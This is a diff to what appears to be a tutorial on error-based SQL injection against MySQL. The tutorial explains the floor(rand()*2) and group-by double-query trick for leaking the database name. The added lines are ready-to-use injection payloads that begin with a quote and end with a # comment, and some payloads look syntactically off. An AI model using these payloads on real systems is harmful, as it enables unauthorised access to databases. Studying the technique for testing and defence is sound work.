@@ -24,7 +24,7 @@ After running repeatedly eventually all values will end up either 0 or 1, thus e
 `Group by` – will aggregate the same values in the column, in this case the assigned alias is “a”
 Further enumeration can be carried out by going after  information_schema.tables:
 
-### `Select count(*),concat((select database()),”.”, Select floor(rand()*2)a from information_schema.tables group by a`  
+### `' or (Select count(*),concat((select database()),"+",floor(rand()*2))a from information_schema.tables group by a)#`  
   
   
 `concat` concatenates 2 strings and `database()` pulls the name of the current DB, thus we concatenate current DB along with "a" from info schema
@@ -37,5 +37,5 @@ We may get an error regarding too many columns for operand if the injection vect
 
 We can play aroun with other commands as below:
 
-`and (select 1 from (Select count(*),concat((select database()),”.”,(select @@version),".",floor(rand()*2)a from information_schema.tables group by a)b` 
+`' or (select 1 from (Select count(*),concat((select database()),"+",floor(rand()*2)) from information_schema.tables group by a)b)#` 
 
